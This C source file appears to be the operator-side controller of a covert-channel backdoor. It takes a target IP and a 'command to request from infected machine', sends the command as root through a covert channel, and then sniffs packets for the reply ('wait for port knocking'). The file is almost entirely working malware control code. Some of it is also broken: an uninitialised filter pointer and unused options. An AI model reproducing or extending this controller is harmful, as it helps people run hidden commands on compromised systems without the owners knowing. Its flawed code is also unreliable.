#include <getopt.h>
#include "../src/encrypt_utils.h"
#include "../src/socketwrappers.h"
#include "../src/covert_wrappers.h"
#include "../src/inotify.h"
#include "../src/libpcap.h"

static void print_usage(void) {
    puts ("Usage options: \n"
            "\t--nic      -   network interface to use\n"
            "\t--target   -   target machine to attack\n"
            "\t--command  -   command to request from infected machine\n"
            "\t--local  -   your local ip\n"
            /*"\t--delay    -   delays between arp spoofs\n"*/);
}

static struct option long_options[] = {
    {"nic",     required_argument,  0,  0 },
    {"target",  required_argument,  0,  1 },
    {"command",   required_argument,  0,  2 },
    {"local",    required_argument,  0,  3 },
    //{"delay",   optional_argument,  0,  4 },
    {0,         0,                  0,  0 }
};



int main(int argc, char **argv){
    int arg;
    char *nic;
    char targetip[BUFFERSIZE];
    char localip[BUFFERSIZE];
    char *pcapfilter;
    unsigned char data[BUFFERSIZE];
    struct filter Filter;
    /* make sure user has root privilege */
    if(geteuid() != 0) {
        printf("Must run as root\n");
        exit(1);
    }

    while (1) {
        int option_index = 0;

        arg = getopt_long(argc, argv, "", long_options, &option_index);

        if(arg == -1) {
            break;
        }

        switch (arg) {
            case 0:
                /*strncpy(nic, optarg, BUFFERSIZE);
                printf("Using NIC: %s\n", nic);*/
                break;
            case 1:
                strncpy(targetip, optarg, BUFFERSIZE);
                //printf("Target ip %s\n", targetip);
                break;
            case 2:
                strncpy(data,optarg, BUFFERSIZE);
                printf("Command %s\n", data);
                break;
            case 3:
                strncpy(localip, optarg, BUFFERSIZE);
                //printf("Local ip %s\n", localip);
                Filter = InitFilter(targetip,localip);
                PrintFilter(Filter);
                break;
            /*case 4:
                break;*/
            default: /*  '?' */
                print_usage();
                exit(1);
        }
    }

    CreateFilter(Filter, pcapfilter);
	covert_send(localip, targetip, Filter.port_short[0], Filter.port_short[0], data, 0);
	//wait for port knocking
    printf("Filter: %s\n",pcapfilter);
	Packetcapture(pcapfilter,Filter);
    exit(1);
    return 0;
}

/*char GetLocalIP(char *device){
	int interfacesocket;
	if((interfacesocket = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) == -1){
		perror("socket():");
		exit(1);
	}
	struct ifreq interface;
	strncpy(interface.ifr_name, device, IFNAMSIZ);

	if(ioctl(interfacesocket, SIOCGIFADDR, &interface) == -1 ){
		perror("ioctl SIOCGIFINDEX:");
		exit(1);
	}

	printf("%s - %s\n" , device , inet_ntoa(( (struct sockaddr_in *)&interface.ifr_addr )->sin_addr) );

	close(interfacesocket);
	return (char)inet_ntoa(( (struct sockaddr_in *)&interface.ifr_addr )->sin_addr);
}*/

